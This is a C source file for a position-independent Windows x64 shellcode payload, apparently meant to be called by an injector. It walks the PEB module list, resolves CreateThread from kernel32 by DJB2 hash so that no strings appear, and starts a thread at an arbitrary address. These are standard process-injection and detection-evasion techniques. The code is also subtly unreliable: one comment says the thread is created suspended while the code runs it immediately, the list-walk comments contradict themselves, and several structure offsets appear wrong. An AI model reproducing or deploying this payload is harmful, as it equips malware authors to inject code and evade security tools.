/* ============================================================================
 *  payload_thread.c — Position-independent payload that resolves
 *  CreateThread(LPTHREAD_START_ROUTINE) via PEB walking (no strings, hashes
 *  only), then creates a thread at a caller-specified address.
 *
 *  Calling convention (Windows x64 / MS ABI):
 *    RCX = entry point to execute in the new thread  (lpStartAddr)
 *    RDX = argument passed to that function           (lpParameter)
 *    Returns thread handle in RAX, or 0 on failure.
 *
 *  The injector calls payload_entry() as a normal function pointer.
 * ============================================================================ */

#include <stdint.h>

/* --------------------------------------------------------------------------
 *  Forward declarations of static helpers
 * -------------------------------------------------------------------------- */
static void*      get_peb(void)              __attribute__((noinline));
static void*      find_module_by_hash(uint32_t hash)
                                              __attribute__((noinline));
static void*      resolve_export_by_hash(void* dll_base, uint32_t fn_hash)
                                              __attribute__((noinline));
static uint32_t   hash_ascii(const char* str) __attribute__((noinline));
static uint32_t   hash_wide_modname(const uint16_t* buf, uint16_t len_bytes)
                                              __attribute__((noinline));

/* --------------------------------------------------------------------------
 *  Pre-computed DJB2 hashes (lower-case ASCII)
 * -------------------------------------------------------------------------- */
#define HASH_KERNEL32_DLL   0x7040EE75UL
#define HASH_CREATE_THREAD  0x7F08F451UL

/* ============================================================================
 *  ENTRY POINT
 *  The first function in .text, so payload_entry is at offset 0.
 * ============================================================================ */
__attribute__((section(".text.entry")))
uint64_t payload_entry(void* start_addr, void* parameter)
{
    if (!start_addr) return 0;

    /* Resolve kernel32 base via PEB */
    void* kernel32 = find_module_by_hash(HASH_KERNEL32_DLL);
    if (!kernel32) return 0;

    /* Resolve CreateThread from kernel32 */
    typedef uint64_t (__attribute__((ms_abi)) *fn_create_thread_t)(
        void*, uint64_t, void*, void*, uint64_t, void*);
    fn_create_thread_t fn_create =
        (fn_create_thread_t)resolve_export_by_hash(kernel32, HASH_CREATE_THREAD);
    if (!fn_create) return 0;

    /* Create a suspended thread so the caller can resume / wait */
    uint64_t thread_id = 0;
    uint64_t hThread = fn_create(
        0,                  /* lpThreadAttributes     */
        0,                  /* dwStackSize            */
        start_addr,         /* lpStartAddress         */
        parameter,          /* lpParameter            */
        0,                  /* dwCreationFlags (0=run immediately) */
        &thread_id          /* lpThreadId             */
    );

    return hThread;
}

/* ============================================================================
 *  PEB access via inline assembly
 * ============================================================================ */
static void* get_peb(void)
{
    void* peb;
    __asm__ volatile ("mov %%gs:0x60, %0" : "=r" (peb));
    return peb;
}

/* ============================================================================
 *  Hash functions (DJB2)
 * ============================================================================ */
static uint32_t hash_ascii(const char* str)
{
    uint32_t h = 5381;
    while (*str) {
        uint8_t c = (uint8_t)(*str++);
        if (c >= 'A' && c <= 'Z') c += 0x20;   /* fold to lower-case */
        h = ((h << 5) + h) + c;
    }
    return h;
}

/* Hash a UNICODE_STRING buffer (UTF-16 LE, 2 bytes per char) */
static uint32_t hash_wide_modname(const uint16_t* buf, uint16_t len_bytes)
{
    uint32_t h = 5381;
    uint16_t i;
    for (i = 0; i < len_bytes / 2; i++) {
        uint16_t wc = buf[i];
        uint8_t  c  = (uint8_t)(wc & 0xFF);
        if (c >= 'A' && c <= 'Z') c += 0x20;
        h = ((h << 5) + h) + c;
    }
    return h;
}

/* ============================================================================
 *  Walk the PEB LDR list to find a module whose BaseDllName hash matches.
 *  Returns the DllBase (image base) on success, NULL on failure.
 * ============================================================================ */
static void* find_module_by_hash(uint32_t target_hash)
{
    void*    peb   = get_peb();
    if (!peb) return 0;

    /* PEB+0x10 = ImageBase; PEB+0x18 = Ldr (PEB_LDR_DATA) */
    void*   ldr   = *(void**)((uint8_t*)peb + 0x18);
    if (!ldr) return 0;

    /* Ldr+0x20 = InMemoryOrderModuleList (a LIST_ENTRY Flink) */
    void*   pFlink = *(void**)((uint8_t*)ldr + 0x20);
    if (!pFlink) return 0;

    /* Walk the doubly-linked list.
     * Each list-entry is embedded in an LDR_DATA_TABLE_ENTRY.
     * For InMemoryOrderLinks, the entry is at offset 0 of the list-head,
     * so the LDR_DATA_TABLE_ENTRY starts 0x10 bytes before the list entry
     * on x64 (InMemoryOrderLinks field at +0x10 relative to the struct). */
    void*   entry  = pFlink;

    /* Guard: limit iterations (max 256 modules) */
    for (int i = 0; i < 256; i++) {
        /* LDR_DATA_TABLE_ENTRY layout on x64:
         *  +0x00  Reserved[2]
         *  +0x10  InMemoryOrderLinks  (LIST_ENTRY)
         *  +0x20  Reserved[2]
         *  +0x30  DllBase
         *  +0x40  Reserved
         *  +0x48  Reserved
         *  +0x50  Reserved[??]
         *  +0x58  BaseDllName  (UNICODE_STRING: +0x00 Length, +0x02 MaxLen, +0x08 Buffer)
         *
         * The exact offset of BaseDllName within LDR_DATA_TABLE_ENTRY
         * on Win10 x64 is 0x58 from the start of the entry.
         */
        uint8_t* base = (uint8_t*)entry;

        /* Read DllBase at offset 0x30 */
        void* dll_base = *(void**)(base + 0x30);
        if (!dll_base) { /* skip empty entries */ goto next; }

        /* Read BaseDllName UNICODE_STRING at offset 0x58
         *   +0x00 Length (u16)
         *   +0x02 MaximumLength (u16)
         *   +0x08 Buffer (ptr) */
        uint16_t name_len   = *(uint16_t*)(base + 0x58);
        void*    name_buf   = *(void**)(base + 0x60);
        if (!name_buf || name_len == 0) goto next;

        uint32_t mod_hash = hash_wide_modname((const uint16_t*)name_buf, name_len);

        if (mod_hash == target_hash) {
            return dll_base;
        }

next:
        /* Advance to the next Flink.  InMemoryOrderLinks.Flink at +0x00
         * relative to the list entry that is AT entry + 0x10.
         * So entry->Flink points to the NEXT entry's Flink field.
         * But entry points to the Flink value of the CURRENT node.
         * We need entry->Flink to get the next node.
         * Wait — careful:
         *   entry points to the Flink field of InMemoryOrderLinks.
         *   So the NEXT Flink is *(void**)entry (the Flink value).
         *   And the node this entry belongs to starts at ((uint8_t*)entry) - 0x10.
         *   The NEXT node's entry = *(void**)entry.
         *   That value is the Flink of the next node, which is 0x10 into
         *   the next LDR_DATA_TABLE_ENTRY.
         *   So we set entry = *(void**)entry to walk the list. */
        void* next_flink = *(void**)entry;
        if (!next_flink || next_flink == pFlink) break; /* back to head → done */
        entry = next_flink;
    }

    return 0;
}

/* ============================================================================
 *  Given a PE module base, resolve an exported function by name hash.
 *  Returns the function address, or NULL on failure.
 * ============================================================================ */
static void* resolve_export_by_hash(void* dll_base, uint32_t fn_hash)
{
    if (!dll_base) return 0;

    uint8_t* base = (uint8_t*)dll_base;

    /* DOS header → e_lfanew */
    if (*(uint16_t*)base != 0x5A4D) return 0;   /* "MZ" */
    uint32_t e_lfanew = *(uint32_t*)(base + 0x3C);

    /* NT headers → FileHeader.SizeOfOptionalHeader → OptionalHeader
     *   +0x00 Signature (4)
     *   +0x04 FileHeader (20 bytes)
     *   +0x18 OptionalHeader (starts at e_lfanew+0x18)
     *   +0x18+sizeof(OptionalHeader) = DataDirectory
     * For PE32+, OptionalHeader has:
     *   +0x00 Magic (2)
     *   ...
     *   +0x70 NumberOfRvaAndSizes (4)
     *   +0x78 DataDirectory[0] IMAGE_DATA_DIRECTORY
     */
    uint8_t* nt = base + e_lfanew;
    if (*(uint32_t*)nt != 0x00004550) return 0;  /* "PE\0\0" */

    /* PE Magic: 0x20B = PE32+ */
    uint16_t magic = *(uint16_t*)(nt + 0x18);
    if (magic != 0x20B) return 0;                /* not PE32+ */

    /* DataDirectory index 0 = Export Directory
     * For PE32+, the DataDirectory starts at offset 0x78 from NT headers.
     * Each entry is 8 bytes: VirtualAddress (4) + Size (4).
     */
    uint32_t export_rva  = *(uint32_t*)(nt + 0x78);
    uint32_t export_size = *(uint32_t*)(nt + 0x7C);
    if (export_rva == 0 || export_size == 0) return 0;

    uint8_t* exp = base + export_rva;

    /* IMAGE_EXPORT_DIRECTORY:
     *   +0x00 Characteristics    (4)
     *   +0x04 TimeDateStamp      (4)
     *   +0x08 MajorVersion       (2)
     *   +0x0A MinorVersion       (2)
     *   +0x0C Name               (4)
     *   +0x10 Base               (4)
     *   +0x14 NumberOfFunctions  (4)
     *   +0x18 NumberOfNames      (4)
     *   +0x1C AddressOfFunctions (4 RVA)
     *   +0x20 AddressOfNames     (4 RVA)
     *   +0x24 AddressOfNameOrdinals (4 RVA)
     */
    uint32_t num_names   = *(uint32_t*)(exp + 0x18);
    uint32_t addr_funcs  = *(uint32_t*)(exp + 0x1C);
    uint32_t addr_names  = *(uint32_t*)(exp + 0x20);
    uint32_t addr_ord    = *(uint32_t*)(exp + 0x24);

    uint32_t* funcs_va = (uint32_t*)(base + addr_funcs);
    uint32_t* names_va = (uint32_t*)(base + addr_names);
    uint16_t* ordinals = (uint16_t*)(base + addr_ord);

    for (uint32_t i = 0; i < num_names; i++) {
        const char* fn_name = (const char*)(base + names_va[i]);
        uint32_t h = hash_ascii(fn_name);
        if (h == fn_hash) {
            /* Get function address from the functions array */
            uint16_t ord = ordinals[i];
            uint32_t fn_rva = funcs_va[ord];
            /* If the function is forwarded, it points into the export section.
             * We don't handle forwarded exports here for simplicity. */
            if (fn_rva >= export_rva && fn_rva < export_rva + export_size) {
                return 0; /* forwarded export — skip */
            }
            return (void*)(base + fn_rva);
        }
    }

    return 0;
}
